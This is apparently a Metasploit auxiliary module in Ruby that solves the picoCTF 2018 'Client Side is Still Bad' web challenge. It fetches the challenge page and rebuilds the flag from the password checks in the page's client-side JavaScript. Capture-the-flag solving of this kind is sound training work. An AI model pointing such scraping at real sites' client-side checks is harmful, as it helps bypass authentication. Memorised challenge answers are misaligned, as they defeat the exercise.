#!/usr/bin/env ruby

require 'msf/core'  # Metasploit module

class MetasploitModule < Msf::Auxiliary

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'Web Explotation: Client Side is Still Bad - Points: 150',
      'Description' => %q(
                        I forgot my password again, but this time there doesn't seem to be a reset, can you help me? http://2018shell2.picoctf.com:8249

                        [HINTS]:
                          Client Side really is a bad way to do it.
                        ),
      'Author'      => ['CosasDePuma <https://github.com/cosasdepuma>'],
      'Privileged'  => 'false',
      'License'     => MSF_LICENSE
    )

    deregister_options('Proxies', 'VHOST', 'SSL')

    deregister_options(                           # Advanced Options
      'DOMAIN', 'DigestAuthIIS', 'FingerprintCheck', 'HttpClientTimeout',
      'HttpPassword', 'HttpTrace', 'HttpUsername', 'SSLVersion', 'WORKSPACE'
    )

    register_options(
      [
        Opt::RHOST('2018shell2.picoctf.com'),
        Opt::RPORT('8249')
      ], self.class
    )
  end

  def run
    begin
      # Send a GET request to the server
      print_status("Sending GET request to TCP/#{rport} /...")
      res = send_request_cgi({
        'uri'     => '/',
        'method'  => 'GET'
      })
      # Get the body of the request
      html_source = res.get_html_document.to_s

      flag = ''
      # Get all the password verify conditions
      chunks = html_source.scan(/if \(checkpass.*\) == '.*'/)
      # Generate the flag
      chunks.each { | condition |
        condition = condition.scan(/'.*'/)[0]
        condition = condition.gsub('\'', '')

        flag = condition + flag
      }
      print_good("Solved: #{flag}")
    rescue
      # Handle errors
      print_error('Unhandled exception during execution')
    end
  end

end
